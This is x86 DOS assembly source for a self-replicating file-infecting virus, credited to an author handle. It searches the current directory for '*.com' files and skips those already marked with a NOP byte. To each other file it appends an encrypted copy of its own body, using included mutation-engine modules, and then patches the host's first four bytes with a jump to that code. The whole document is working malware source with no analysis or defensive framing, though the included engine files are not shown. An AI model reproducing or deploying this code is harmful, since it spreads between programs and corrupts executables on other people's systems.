; (c) Pr0cedure pr0cedure@chat.ru

Model Tiny
.code
org 100h
start:
      db 90h
      jmp Virus
      db 100h dup (90h)
Virus:
      mov si, word ptr ds:[102h]
      add si,VVV+4
      mov di,si
      add di,MyLength + 3
      mov cx,MyLength / 2 + 1
      call ABME
      jmp Vir1
include abme.inc
TBL:
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
dw 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h, 0000h
VVV equ $-Virus
Vir1:
      call EntryPoint
EntryPoint:
TBL_OFS equ $-TBL
StartOffs equ $-Virus
      pop bp
      mov si,bp
      add si,OldBytes
      mov di,100h
      cld
      movsw
      movsw
      mov ah,4eh
      mov cx,0fh
      mov dx,MaskOfs
Interrupt:
      int 21h
      jb NotFile
      call SomeInfect
      mov ah,4fh
      jmp short Interrupt
NotFile:
      mov si,100h
      jmp si
SomeInfect:
      mov dx,9eh
      mov ax,3d02h
      int 21h
      xchg ax,bx
      mov ah,3fh
      mov dx,bp
      add dx,OldBytes
      push dx
      mov cx,4
      int 21h
      pop di
      cmp byte ptr ds:[di],90h
      jne Infect
CloseFile:
      mov ah,3eh
      int 21h
      ret
Infect:
      mov ax,4202h
      xor cx,cx
      xor dx,dx
      int 21h
      sub ax,3
      push ax
      mov dx,bp
      sub dx,StartOffs
      mov cx,VVV-TableLength
      mov ah,40h
      int 21h
      mov si,bp
      sub si,3
      mov di,bp
      add di,MyLength
      push di
      mov cx,MyLength+3
      call BME
      push cx
      mov ah,40h
      mov dx,bp
      add dx,AAV+RAS+Table_Of_Keys
      mov cx,TableLength
      int 21h
      pop cx
      mov ah,40h
      pop dx
      int 21h
      mov ax,4200h
      xor cx,cx
      xor dx,dx
      int 21h
      mov si,bp
      add si,OldBytes
      mov word ptr ds:[si],0E990h
      pop ax
      mov word ptr ds:[si+2],ax
      mov ah,40h
      mov dx,bp
      add dx,OldBytes
      mov cx,4
      int 21h
      jmp CloseFile
AAV equ $-EntryPoint
include bme.inc
include rame_rnd.inc
MaskOfs equ $-EntryPoint
db '*.com',0h
OldBytes equ $-EntryPoint
dw 9090h, 9090h
MyLength equ $-EntryPoint
end start
